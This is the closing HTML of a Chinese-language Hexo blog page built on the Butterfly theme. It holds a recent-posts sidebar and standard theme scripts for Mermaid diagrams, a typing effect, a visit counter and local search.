datetime="2025-04-05T08:24:14.000Z" title="发表于 2025-04-05 16:24:14">2025-04-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/4a17b156.html" title="Hello World">Hello World</a><time datetime="2025-03-02T11:12:50.360Z" title="发表于 2025-03-02 19:12:50">2025-03-02</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>